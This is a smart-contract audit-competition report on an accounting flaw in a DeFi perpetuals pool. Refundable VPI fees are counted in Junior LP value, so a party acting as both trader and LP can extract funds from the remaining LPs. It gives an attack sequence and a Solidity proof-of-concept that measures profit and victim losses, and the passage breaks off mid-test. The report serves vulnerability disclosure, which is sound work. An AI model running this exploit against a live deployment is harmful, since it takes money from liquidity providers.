# \#99428 [SC-Critical] Refundable VPI is counted as Junior NAV: an exiting LP is paid a share, remaining LPs refund it

**Submitted on Nov 13th 2026 at 16:23:35 UTC by @xbriefer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99428
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief / Intro

A skew-increasing open pays a positive VPI charge `V`. The pool books the whole charge as LP revenue at once, so the next reconcile puts it into Junior principal. The charge is not final: when the same trader closes and the skew falls back, the pool pays a rebate of up to `V` (lifetime-VPI clamp) from free pool cash. LP NAV carries nothing for that pending rebate.

A Junior LP whose redemption is funded at the hourly LP settlement between the open and the close is therefore paid a pro-rata share of `V`, and the LPs that stay pay the rebate a few seconds later. One address that is both trader and Junior LP can do this deliberately: open about 20 seconds before the hour boundary, let the redemption settle, close. The price does not need to move.

PoC at the `DEPLOYMENT.md` risk parameters, pool of 1,002,000 USDG, measured against the same cycle without the trade: attacker +143.55 USDG, the other Junior LP −298.33 USDG per cycle. Over 8 cycles (24 h): attacker +1,164.85 USDG, the other LP −2,403.88 USDG (1.20% of its capital). An ordinary new depositor is hit by the same mispricing: a 200,000 USDG Junior deposit that activates while the charge sits in the pool is worth 199,863.69 USDG right after the trader's close.

**Relation to the AI-scan item "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate".** That item is about the size of the rebate: lower depth at the close lets a trader reclaim more than the curve allows, up to the lifetime clamp. In the attack below the LP exit does lower depth and the clamp binds, so the trader gets `V` back instead of the plain curve value. That effect is 0.58 USDG per cycle (trader balance 9,687.43 with the exit vs 9,686.86 without). The value moved to the exiting LP here is 445.14 USDG per cycle (the other LP's loss is 298.33 USDG) and comes from the exit price, which counts `V` as Junior equity. Two tests isolate it from depth: in the depth-neutral control a third party deposits the amount the attacker redeems at the same boundary, depth at the close is higher than at the open, the clamp does not bind (rebate 761.46 < 761.71 paid), and the exiting LP still collects the same 445.14 USDG; in the new-depositor test there is no exit at all, depth rises by 20%, and the depositor still loses 136.31 USDG.

## Vulnerability Details

Frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, paths under `packages/perps/src`.

1. **Open: the VPI charge is pool cash and LP revenue immediately.**
   `CfdEngineSettlementSidecar.executeOpen` L446-464 debits the trade cost to the pool (`clearinghouse.applyOpenCost(..., host.pool(), ...)`) and calls `recordClaimantInflow(poolCashInflowAssets, Revenue, CashArrived)`; `HousePool.recordClaimantInflow` L640-642 does `accountedAssets += amount`. The position records the charge in `vpiAccrued` (`_writeOpenPosition`, L517).

2. **LP settlement: the charge is Junior principal.**
   `HousePool._settleLpEpoch` reconciles first (L835). `HousePoolAccountingLib.buildReconcileSnapshot` L60-78 computes distributable equity as physical assets minus trader claims plus the terminal price delta. `HousePoolReconcilePlanLib.planReconcile` L84-99 routes the surplus over principal through `HousePoolWaterfallAccountingLib.distributeRevenue` L140-159 (Senior up to its high-water mark, the rest to Junior). Junior redemptions are then priced from that principal (L840, `_fundRedemptionPhase` L944-1028). No term for outstanding positive `vpiAccrued` exists in the snapshot, the terminal book or the withdrawal reserve.

3. **Close: the pool pays a rebate of up to `V`.**
   `CloseAccountingLib.buildCloseState` L103-118 takes the fresh curve delta, which is negative for a skew-reducing close, and only clamps it so that `accrued + delta >= 0`. `CfdEnginePlanLib._planCloseActionSettlement` L1041-1060 turns the negative net action amount into `actionRebateAssets` (net of the close fee); L970-978 pays it from pool cash that is free of trader claims and waives only what that cash cannot cover; `CfdEngineSettlementSidecar._executeClose` L621-624 executes `pool.payOut(...)` and `settleAssets(...)`. In the PoC the pool holds about 702,000 USDG at the close (1,002,000 minus the 300,000 redeemed; derived, not logged), so nothing is waived. The opener controls the trigger: it is its own close.

4. **What the design covers and what it does not.**
   The documents keep VPI out of the marked price book on purpose (`ACCOUNTING_SPEC.md` L140-142; `SECURITY.md` L863) and state that "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV" (`SECURITY.md` L871-872). That holds for anticipated VPI and for the negative side: a negative lifetime VPI is locked in a dedicated reserve so that "LPs cannot withdraw it as marked equity before the matching position obligation settles" (`WHITEPAPER.md` L887-888, `ACCOUNTING_SPEC.md` L821-822), and the lifetime clamp is commented "Prevents LP sandwich attacks" (`CloseAccountingLib` L112-115). For collected positive VPI the same exclusion works the other way: the cash is inside NAV through physical assets, the rebate it is exposed to is not, and LPs can withdraw it before the position settles. The clamp does not help: the trader's lifetime VPI ends at zero (test 1) or slightly above (test 3), so the clamp never takes anything back; the value leaves on the LP leg.

   Two documented points need a direct answer. `SECURITY.md` L871-872 also says unfunded rebates are "waived rather than claim-backed". The waiver only applies when free pool cash is short; with cash present the rebate is paid in full, and the opener decides when. `ACCOUNTING_SPEC.md` L731-739 accepts that a trader and an incoming LP can time carry collection, as a "collection-time ownership policy". Carry is final once collected. VPI is not: the pool pays it back on the trader's own close, which is why counting it as distributable equity at collection time lets it leave twice.

   The public docs describe the two sides the same way. The trading-costs page (docs.plether.com) says "Positive VPI is a liquidity pool inflow" and that positive VPI is "pool trading revenue owned by LPs", while a negative value is "a provisional rebate" that "may be reclaimed when that exposure closes". So the provisional status and its reserve exist for rebates the trader received. Nothing marks a charge the trader paid as provisional, although the pool pays it back on the same close path. Neither the docs nor `SECURITY.md` (including "VPI limitations", L1434-1444) mention that collected positive VPI is paid out to exiting LPs before it is final.

   `SECURITY.md` L1036-1062 says the five-minute quiet period "is not an immutable settlement snapshot" and that "trading, closes, liquidations, claims, carry, and pool accounting can change NAV"; the docs say shares keep gaining or losing value until a withdrawal is funded. That describes NAV moving with real results between cutoff and settlement. The case here is different: at the settlement itself the NAV formula counts cash that a single trader can take back seconds later, so the exit price includes a charge that is still refundable at the moment it is fixed, and the same party can place both the charge and the exit.

### Attack sequence (one cycle, production entrypoints, no privileged call)

The attacker holds Junior shares past the 1 h cooldown and margin in the clearinghouse (one address for both in the PoC files).

1. Before the 5-minute cutoff: `juniorVault.requestRedeem(shares, attacker, attacker)`.
2. About 20 s before the hour boundary: `commitOrder` (LONG, 39% of pool depth; the skew cap is 40%) and `executeOrder` with the first post-commit tick. `V = k·s²/(2·D)` goes to the pool: 761.71 USDG.
3. At the boundary: `router.settleLpEpoch(update)`. The redemption is funded at a Junior price that includes `V`; the attacker claims the USDG.
4. Right after: commit and execute the full close. The pool pays the curve rebate, capped at `V`, net of the close fee (605.42 USDG).
5. Re-deposit, activation at the next boundary, 1 h cooldown, repeat (3 h cycle in the PoC).

Per cycle the exiting LP gains `g·V` (g = redeemed share of Junior). The trader pays two execution fees of 4 bps of notional; the open fee goes to the treasury and the close fee stays in the pool. Break-even at s = 0.39·D is g ≈ 41% (2 × 156.28 / 761.71).

## Impact Details

- **Who loses:** whoever holds Junior between the settlement and the close funds the rebate pro rata without having received the matching share of the charge. With no new entrant that is the remaining LP: against the same cycle without the trade it loses 298.33 USDG (without the trade it loses only the Senior coupon, 7.90 USDG, derived from tests 1 and 2; with the trade but without the LP exit it gains its share of the close fee). In the depth-neutral test it is the incoming depositor (−362.17 USDG), while the original LP ends 60.75 USDG up.
- **Who gains:** the exiting LP. Attacker after trading fees: +143.55 USDG per cycle against the same cycle without the trade. Pool: 501k Senior, 501k Junior including the 1k fixture seeds, attacker 300k (60% of Junior).
- **Repeatability:** 8 cycles in 24 h of open market in this configuration: attacker +1,164.85 USDG, other LP −2,403.88 USDG (1.20% of its capital).
- **Mispricing without an attacker:** any Junior entry or exit that settles while a refundable charge is in the pool is mispriced by its share of that charge. New-depositor test: −136.31 USDG on 200,000 USDG right after entry.
- **Bound:** a charge one account can create and reclaim is limited by the skew cap: `V ≤ k·0.4²/2 = 8 bps` of pool depth per cycle.

Preconditions and limits (measured in `M3VpiNavExit_Sensitivity.t.sol`, each against the same cycle without the trade):

| Condition | Attacker | Other Junior LP |
|---|---|---|
| attacker redeems 40% of Junior | −8.49 | −147.30 |
| attacker redeems 45% of Junior | +29.52 | −185.13 |
| Pyth confidence 5 bps per component (adverse execution shift) | +88.71 | −243.76 |
| Pyth confidence 10 bps (the configured maximum ratio) | +33.88 | −189.18 |
| Senior 70% of pool: exit only 70% funded under the Senior-share limit | −43.47 | −111.88 |
| another trader opens the opposite side (half size) before the attacker's close | −617.88 | −777.09 |

- The exit must be fully funded: the Senior-share limit (80%) requires Junior ≥ Senior·0.25 after the redemption, and the free-asset reserve subtracts the open position's maximum liability. The attacker must redeem at least about 41% of Junior (rows 1 and 2), and Junior must be large enough for that redemption to pass the limit: about 30% of the pool at the 41% minimum, about 38% at the 60% share used here (derived). In row 5 Junior is 30% of the pool, the 60% exit is only partly funded and the cycle loses money. Existing skew in the same direction lowers the required share; opposite skew raises it.
- The trader position is open for about 21 seconds across the boundary. Price moves in that window are zero-mean PnL on the trader leg. An opposite-side order executed in that window takes part of the rebate and the cycle loses money (last row).
- The fixture's mock Pyth has zero confidence, so the side-adverse confidence shift is not charged in the main PoC; rows 3 and 4 measure it with the fixture multiplier of 2,000 bps. At the `DEPLOYMENT.md` multiplier of 2,500 bps the cost is a quarter higher; at the 10 bps confidence maximum the attacker result extrapolates to about break-even (linear extrapolation, not run).
- Only in live market hours.
- All amounts use the `DEPLOYMENT.md` risk parameters, which the program names as the basis for severity (VPI factor 1%, skew cap 40%, execution fee 4 bps), not the repository's test-fixture values. They scale with those parameters: `V` with the VPI factor and the square of the skew cap, the break-even share with the fee.

Impact: **High — Theft of unclaimed yield.** The amount taken is LP revenue that was paid out before it was final; the LPs that stay make it good. The amount per cycle is capped at 8 bps of pool depth and depends on the preconditions above (share of Junior, pool composition, oracle confidence, no opposite flow in the window). Per the program rules, feasibility affects only the payout.

## References

- `packages/perps/src/CfdEngineSettlementSidecar.sol` L446-464, L517, L621-624
- `packages/perps/src/HousePool.sol` L624-651, L835-888, L944-1028, L1205-1217, L1555-1599
- `packages/perps/src/libraries/HousePoolAccountingLib.sol` L60-78; `HousePoolReconcilePlanLib.sol` L84-99; `HousePoolWaterfallAccountingLib.sol` L140-159
- `packages/perps/src/libraries/CloseAccountingLib.sol` L103-118; `CfdEnginePlanLib.sol` L970-978, L1041-1060
- `packages/perps/SECURITY.md` L859-863, L871-872, L1036-1062, L1434-1444; docs.plether.com trading-costs and LP-returns pages; `WHITEPAPER.md` L411-412, L887-888; `ACCOUNTING_SPEC.md` L140-142, L731-739, L821-822

Known issues checked:
- AI scan "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" and "Temporary pool liquidity can reduce a skew-increasing close charge": root cause is execution-time depth in the VPI formula. Different root cause here (NAV counts refundable VPI); see Brief and the depth-neutral test.
- `SECURITY.md` "VPI limitations": L1443 says the clamp "intentionally zeroes otherwise extractable rebate-only round trips". Here the clamp does zero the trader's VPI; the value leaves on the LP leg.
- `SECURITY.md` "LP request cutoff": NAV is not a snapshot between cutoff and settlement. It does not say NAV includes revenue that is still refundable.
- SC-M3 (initial-margin projection), SC-H1 and Cecuro MED-12 (other revenue-routing issues, fixed).

## Recommended fix

Keep refundable VPI out of distributable LP equity until it is final. Either hold positive VPI in a pool-side pending bucket (like the existing pending claimant buckets) and release to LP revenue only what is no longer refundable when the paying position is closed or liquidated, or subtract the aggregate refundable amount from distributable equity in the reconcile snapshot (for example the current curve potential `C(skew)`, capped by the sum of positive lifetime accruals) so that LP entry and exit are priced net of it.

## Proof of Concept

## Proof of Concept

Files (new test files only; no in-scope contract modified):
- `packages/perps/test/perps/audit/M3VpiNavExit.t.sol` — 5 tests
- `packages/perps/test/perps/audit/M3VpiNavExit_Sensitivity.t.sol` — 6 tests (the table above)

Fixture: the repository's `BasePerpTest` (mock Pyth with zero confidence, mock settlement token, Router deployed as the repository's `LegacyOrderRouterHarness`, which is `OrderRouter` plus a scalar commit overload the tests do not use). The `DEPLOYMENT.md` risk parameters (VPI 1%, skew cap 40%, maintenance 10 bps, initial 20 bps, FAD 300 bps, carry 500 bps, bounty 10 bps) are passed to the Engine constructor through the fixture's `_riskParams` override; the Senior limits (40M / 80%) go through the owner propose/finalize path; the fixture's LP funding helper installs marks through the Router address. The attack path calls only V3 `commitOrder(OrderRequest)`, `executeOrder`, `OrderRouter.settleLpEpoch(bytes[])` and the vault request/claim functions.

Run from the repository root:

```
forge test --root packages/perps --match-path "test/perps/audit/M3VpiNavExit*.t.sol" -vv
```

Result: 11 passed, also with Forge 1.5.1 (the version named on the program page) and solc 0.8.35 via-IR on a clean checkout of the frozen commit. Amounts in USDG.

1. `test_PoC_StepByStep_RefundableVpiIsPaidToExitingLp` — one boundary with assertions at every step. Pool depth 1,002,000; notional 390,700; VPI paid 761.709031; Junior price 0.999304 → 1.000816 at the exit → 0.997806 after the rebate; LP exit +445.139520 over the 300,000 deposited; pool pays 605.423932 at the close; trader round trip −312.565099; attacker net +132.574421; other LP 199,994.212470 → 199,694.350626.
2. `test_PoC_AttackVersusControls_OneCycle` — same starting state three ways: (A) LP exit and re-entry without the trade, (B) trade round trip without the LP exit, (C) attack. Other LP: A 199,986.31, B 200,051.66, C 199,687.98. Attacker total C − A: +143.545385. Trader balance: B 9,686.856634, C 9,687.434901.
3. `test_PoC_DepthNeutral_ExitStillCapturesVpi` — a third party deposits 300,000 at the same boundary. Depth at close 1,002,316.57 (open: 1,002,000.00); rebate 761.463453 < 761.709031 paid; LP exit gain 445.139520; attacker net +132.333942; the third-party deposit is worth 299,637.829059 afterwards (−362.170941).
4. `test_PoC_NewDepositorInheritsTraderRebateObligation` — no exit at all. A 200,000 deposit activates at price 1.000816 (0.999297 before the open) and is worth 199,863.687095 after the trader's close (−136.312905).
5. `test_PoC_Repeatable_EightCycles` — 8 cycles vs the same 8 cycles without the trade: attacker +1,164.851911, other LP −2,403.880521 (120 bps of its capital).

### Test file 1: `packages/perps/test/perps/audit/M3VpiNavExit.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

/// @title PoC: collected-but-refundable VPI is priced into Junior LP NAV
/// @notice A Junior LP that redeems at the hourly settlement is paid a pro-rata share of a VPI charge that the
///         protocol still owes back to the trader (lifetime-VPI clamp). The remaining Junior LPs fund the full
///         rebate afterwards. A party controlling both the trader and the LP can repeat this each cycle in which
///         its exit is fully funded.
/// @dev    Fixture: repo `BasePerpTest` (mock Pyth with zero confidence, mock settlement token, Router deployed as
///         the repo's `LegacyOrderRouterHarness` = `OrderRouter` plus a scalar commit overload this test does not
///         use). setUp sets the DEPLOYMENT.md risk parameters and Senior limits through the owner config path.
///         The attack path only calls production entrypoints: V3 `commitOrder`, `executeOrder`, `settleLpEpoch`
///         and the vault request/claim functions. No in-scope contract is modified.
contract M3VpiNavExitPoC is BasePerpTest {

    /// @dev One address is both the Junior LP and the trader (LP shares live in the vault, margin in the
    ///      clearinghouse). The two names only keep the test readable.
    address internal constant ATTACKER_LP = address(0xA77AC1);
    address internal constant ATTACKER_TRADER = ATTACKER_LP;
    address internal constant VICTIM_LP = address(0x71C71);
    address internal constant SENIOR_LP = address(0x5E5105);

    uint256 internal constant SENIOR_ASSETS = 500_000e6;
    uint256 internal constant ATTACKER_JUNIOR_ASSETS = 300_000e6;
    uint256 internal constant VICTIM_JUNIOR_ASSETS = 200_000e6;
    uint256 internal constant TRADER_FUNDS = 10_000e6;
    uint256 internal constant PRICE = 1e8;

    uint256 internal clientNonce;

    struct Outcome {
        uint256 attackerLpValue; // wallet USDG + Junior shares at projected price
        uint256 attackerTraderBalance; // clearinghouse settlement balance
        uint256 victimValue; // victim Junior shares at projected price
        uint256 seniorPrincipal;
        uint256 treasuryBalance;
    }

    // ------------------------------------------------------------------
    // Fixture
    // ------------------------------------------------------------------

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev packages/perps/DEPLOYMENT.md release risk parameters.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        // DEPLOYMENT.md Senior limits: 40M USDG and 80% of the pool.
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(ATTACKER_LP, ATTACKER_JUNIOR_ASSETS);
        _fundJunior(VICTIM_LP, VICTIM_JUNIOR_ASSETS);
        _fundSenior(SENIOR_LP, SENIOR_ASSETS);
        _fundTrader(ATTACKER_TRADER, TRADER_FUNDS);

        // Start every scenario 10 minutes into a fresh LP epoch with all share cooldowns elapsed.
        _warp(pool.lpEpochStart(pool.currentLpEpoch() + 3) + 600);
    }

    // ------------------------------------------------------------------
    // Helpers (production entrypoints only)
    // ------------------------------------------------------------------

    function _warp(
        uint256 timestamp
    ) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = keccak256(abi.encode("M3", ++clientNonce));
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        r.isClose = isClose;
        r.bounds.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        r.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        r.bounds.allowedExecutionModes = 7;
        r.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        r.bounds.maxExecutionBountyAssets = type(uint256).max;
        r.bounds.maxExecutionNotionalAssets = type(uint256).max;
        r.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        r.bounds.maxActionChargeAssets = type(uint256).max;
        r.bounds.maxExplicitFeesAssets = type(uint256).max;
        r.bounds.maxPostPositionSize = type(uint256).max;
        r.bounds.maxPostLeverageBps = type(uint32).max;
    }

    /// @dev Trader commits a V3 order and executes it itself with the first post-commit tick (keepers are
    ///      permissionless; self-execution returns the opening bounty to the account).
    function _commitAndExecute(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory r = _request(side, size, margin, isClose);
        vm.prank(ATTACKER_TRADER);
        uint64 orderId = router.commitOrder(r);
        bytes[] memory update = _mockPythUpdateData(PRICE);
        vm.prank(ATTACKER_TRADER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _juniorPrice1e18() internal view returns (uint256) {
        (, uint256 juniorPrincipal,,) = pool.getPendingTrancheState();
        return juniorPrincipal * 1e18 / juniorVault.totalSupply();
    }

    function _juniorValue(
        address lp
    ) internal view returns (uint256) {
        (, uint256 juniorPrincipal,,) = pool.getPendingTrancheState();
        return juniorPrincipal * juniorVault.balanceOf(lp) / juniorVault.totalSupply();
    }

    function _outcome() internal view returns (Outcome memory o) {
        o.attackerLpValue = settlementToken.balanceOf(ATTACKER_LP) + _juniorValue(ATTACKER_LP);
        o.attackerTraderBalance = clearinghouse.balanceAssets(ATTACKER_TRADER);
        o.victimValue = _juniorValue(VICTIM_LP);
        (o.seniorPrincipal,,,) = pool.getPendingTrancheState();
        o.treasuryBalance = clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    /// @notice One 3-hour cycle. `trade`: the trader opens a skew-creating LONG 20 s before the hour boundary and
    ///         closes it right after LP settlement. `lpExit`: the attacker LP redeems all Junior shares at that
    ///         boundary and re-deposits afterwards.
    function _cycle(
        bool trade,
        bool lpExit
    ) internal {
        uint256 redeemRequestId;
        uint256 shares = juniorVault.balanceOf(ATTACKER_LP);
        if (lpExit) {
            vm.prank(ATTACKER_LP);
            redeemRequestId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
        }
        uint256 boundary = pool.lpEpochStart(pool.currentLpEpoch() + 1);

        // 39% of pool depth (skew cap is 40%), whole 100-token lots.
        uint256 size = ((pool.totalAssets() * 39 / 100) / 100e6) * 100e18;

        _warp(boundary - 20);
        if (trade) {
            _commitAndExecute(CfdTypes.Side.LONG, size, 4000e6, false);
        }

        // Hour boundary: anyone settles the LP epoch through the Router with a post-boundary tick.
        // (Without a queued LP request there is no epoch work and settlement would revert with NoLpEpochProgress.)
        _warp(boundary);
        if (lpExit) {
            router.settleLpEpoch(_mockPythUpdateData(PRICE));
        }

        if (lpExit) {
            assertEq(juniorVault.claimableRedeemRequest(redeemRequestId, ATTACKER_LP), shares, "exit fully funded");
            vm.prank(ATTACKER_LP);
            juniorVault.claimRedeem(redeemRequestId, shares, ATTACKER_LP, ATTACKER_LP);
        }

        if (trade) {
            _commitAndExecute(CfdTypes.Side.LONG, size, 0, true);
            (uint256 remainingSize,,,,,,) = engine.positions(ATTACKER_TRADER);
            assertEq(remainingSize, 0, "position closed");
        }

        if (lpExit) {
            // Re-enter with the full proceeds: request -> next boundary activation -> claim -> 1h cooldown.
            uint256 assets = settlementToken.balanceOf(ATTACKER_LP);
            vm.startPrank(ATTACKER_LP);
            settlementToken.approve(address(juniorVault), assets);
            uint256 depositRequestId = juniorVault.requestDeposit(assets, ATTACKER_LP, ATTACKER_LP);
            vm.stopPrank();
            _warp(boundary + 3600);
            router.settleLpEpoch(_mockPythUpdateData(PRICE));
            vm.prank(ATTACKER_LP);
            juniorVault.claimDeposit(depositRequestId, assets, ATTACKER_LP, ATTACKER_LP);
            _warp(boundary + 2 * 3600 + 1);
        } else {
            _warp(boundary + 2 * 3600 + 1);
        }
    }

    function _run(
        bool trade,
        bool lpExit,
        uint256 cycles
    ) internal returns (Outcome memory o) {
        for (uint256 i; i < cycles; ++i) {
            _cycle(trade, lpExit);
        }
        o = _outcome();
    }

    // ------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------

    /// @notice Shows the mechanism step by step for one hour boundary.
    function test_PoC_StepByStep_RefundableVpiIsPaidToExitingLp() public {
        uint256 shares = juniorVault.balanceOf(ATTACKER_LP);
        uint256 priceBefore = _juniorPrice1e18();
        uint256 victimBefore = _juniorValue(VICTIM_LP);

        vm.prank(ATTACKER_LP);
        uint256 requestId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
        uint256 boundary = pool.lpEpochStart(requestId);
        uint256 size = ((pool.totalAssets() * 39 / 100) / 100e6) * 100e18;
        console2.log("pool depth (totalAssets)               ", pool.totalAssets());
        console2.log("position notional at 1.00              ", size / 1e12);

        // (1) Trader pays VPI into the pool.
        _warp(boundary - 20);
        uint256 poolBeforeOpen = pool.totalAssets();
        uint256 traderBefore = clearinghouse.balanceAssets(ATTACKER_TRADER);
        _commitAndExecute(CfdTypes.Side.LONG, size, 4000e6, false);
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER_TRADER);
        uint256 vpiPaid = uint256(vpiAccrued);
        assertGt(vpiAccrued, 0, "skew-creating open pays positive VPI");
        assertEq(pool.totalAssets() - poolBeforeOpen, vpiPaid, "VPI is pool cash immediately");

        // (2) LP settlement prices the whole VPI charge into Junior NAV.
        _warp(boundary);
        router.settleLpEpoch(_mockPythUpdateData(PRICE));
        uint256 priceAtExit = _juniorPrice1e18();
        vm.prank(ATTACKER_LP);
        uint256 exitAssets = juniorVault.claimRedeem(requestId, shares, ATTACKER_LP, ATTACKER_LP);
        assertGt(priceAtExit, priceBefore, "exit price includes the VPI charge");

        // (3) Trader closes at the same price and is rebated the VPI (lifetime clamp) from the pool.
        uint256 poolBeforeClose = pool.totalAssets();
        _commitAndExecute(CfdTypes.Side.LONG, size, 0, true);
        uint256 poolPaidAtClose = poolBeforeClose - pool.totalAssets();
        uint256 traderAfter = clearinghouse.balanceAssets(ATTACKER_TRADER);
        uint256 priceAfter = _juniorPrice1e18();
        uint256 victimAfter = _juniorValue(VICTIM_LP);

        console2.log("VPI paid at open (USDG atoms)          ", vpiPaid);
        console2.log("Junior price before   (1e18)           ", priceBefore);
        console2.log("Junior price at exit  (1e18)           ", priceAtExit);
        console2.log("Junior price after    (1e18)           ", priceAfter);
        console2.log("attacker LP exit proceeds              ", exitAssets);
        console2.log("attacker LP gain vs deposit            ", exitAssets - ATTACKER_JUNIOR_ASSETS);
        console2.log("pool cash paid to trader at close      ", poolPaidAtClose);
        console2.log("trader round-trip cost (fees only)     ", traderBefore - traderAfter);
        console2.log("victim Junior value before             ", victimBefore);
        console2.log("victim Junior value after              ", victimAfter);

        assertLt(priceAfter, priceBefore, "remaining Junior LPs end below their pre-attack price");
        assertLt(victimAfter, victimBefore, "victim lost principal");
        uint256 attackerNet = exitAssets + traderAfter;
        assertGt(attackerNet, ATTACKER_JUNIOR_ASSETS + traderBefore, "attacker (LP + trader) is net positive");
        console2.log("ATTACKER NET PROFIT (LP + trader)      ", attackerNet - ATTACKER_JUNIOR_ASSETS - traderBefore);
        console2.log("VICTIM LOSS                            ", victimBefore - victimAfter);
    }

    /// @notice Same state, three ways: (a) honest LP exit, no trade; (b) trade round trip, no LP exit; (c) attack.
    function test_PoC_AttackVersusControls_OneCycle() public {
        uint256 snapshot = vm.snapshotState();
        Outcome memory exitOnly = _run(false, true, 1);
        vm.revertToState(snapshot);
        Outcome memory tradeOnly = _run(true, false, 1);
        vm.revertToState(snapshot);
        Outcome memory attack = _run(true, true, 1);

        _log("control A: LP exit+re-entry, no trade", exitOnly);
        _log("control B: trade round trip, no LP exit", tradeOnly);
        _log("attack   : trade round trip across LP exit", attack);

        // Control B: without the LP exit the round trip only costs the trader fees; LPs are not harmed.
        assertGe(tradeOnly.victimValue, exitOnly.victimValue, "round trip alone does not hurt LPs");
        // Attack: victim is worse off than in both controls, attacker is better off than in both controls.
        assertLt(attack.victimValue, exitOnly.victimValue, "victim loses vs control A");
        assertLt(attack.victimValue, tradeOnly.victimValue, "victim loses vs control B");
        uint256 attackTotal = attack.attackerLpValue + attack.attackerTraderBalance;
        assertGt(attackTotal, exitOnly.attackerLpValue + exitOnly.attackerTraderBalance, "attacker gains vs control A");
        assertGt(
            attackTotal, tradeOnly.attackerLpValue + tradeOnly.attackerTraderBalance, "attacker gains vs control B"
        );
        console2.log("attacker profit vs control A", attackTotal - exitOnly.attackerLpValue - exitOnly.attackerTraderBalance);
        console2.log("victim loss vs control A    ", exitOnly.victimValue - attack.victimValue);
    }

    /// @notice The extraction repeats every cycle (3 hours here: exit, re-entry, cooldown).
    function test_PoC_Repeatable_EightCycles() public {
        uint256 snapshot = vm.snapshotState();
        Outcome memory control = _run(false, true, 8);
        vm.revertToState(snapshot);
        Outcome memory attack = _run(true, true, 8);

        _log("control: 8 cycles of LP exit+re-entry, no trade", control);
        _log("attack : 8 cycles", attack);

        uint256 attackTotal = attack.attackerLpValue + attack.attackerTraderBalance;
        uint256 controlTotal = control.attackerLpValue + control.attackerTraderBalance;
        assertGt(attackTotal, controlTotal, "attacker net positive over 8 cycles");
        assertLt(attack.victimValue, control.victimValue, "victim loses over 8 cycles");
        console2.log("attacker profit over 8 cycles (24h)", attackTotal - controlTotal);
        console2.log("victim loss over 8 cycles (24h)    ", control.victimValue - attack.victimValue);
        console2.log("victim loss bps of its capital     ", (control.victimValue - attack.victimValue) * 10_000 / control.victimValue);
    }

    /// @notice Depth-neutral control. A third party deposits the same amount the attacker redeems, at the same
    ///         boundary, so pool depth at the trader's close is not reduced by the exit and the lifetime clamp does
    ///         not bind (the rebate is the plain curve value, below the amount paid). The exiting LP still collects
    ///         the same share of the VPI charge; the loss is in the exit price, not in the size of the rebate. It
    ///         lands on the depositor that bought in at the same inflated price.
    function test_PoC_DepthNeutral_ExitStillCapturesVpi() public {
        address thirdParty = address(0x7417D);
        uint256 shares = juniorVault.balanceOf(ATTACKER_LP);
        uint256 victimBefore = _juniorValue(VICTIM_LP);
        uint256 traderBefore = clearinghouse.balanceAssets(ATTACKER_TRADER);

        vm.prank(ATTACKER_LP);
        uint256 requestId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
        settlementToken.mint(thirdParty, ATTACKER_JUNIOR_ASSETS);
        vm.startPrank(thirdParty);
        settlementToken.approve(address(juniorVault), ATTACKER_JUNIOR_ASSETS);
        uint256 depositId = juniorVault.requestDeposit(ATTACKER_JUNIOR_ASSETS, thirdParty, thirdParty);
        vm.stopPrank();
        assertEq(depositId, requestId, "deposit and redemption settle at the same boundary");

        uint256 boundary = pool.lpEpochStart(requestId);
        uint256 size = ((pool.totalAssets() * 39 / 100) / 100e6) * 100e18;
        uint256 depthAtOpen = pool.totalAssets();

        _warp(boundary - 20);
        _commitAndExecute(CfdTypes.Side.LONG, size, 4000e6, false);
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER_TRADER);

        _warp(boundary);
        router.settleLpEpoch(_mockPythUpdateData(PRICE));
        vm.prank(ATTACKER_LP);
        uint256 exitAssets = juniorVault.claimRedeem(requestId, shares, ATTACKER_LP, ATTACKER_LP);
        vm.prank(thirdParty);
        juniorVault.claimDeposit(depositId, ATTACKER_JUNIOR_ASSETS, thirdParty, thirdParty);
        uint256 depthAtClose = pool.totalAssets();

        uint256 poolBeforeClose = pool.totalAssets();
        _commitAndExecute(CfdTypes.Side.LONG, size, 0, true);
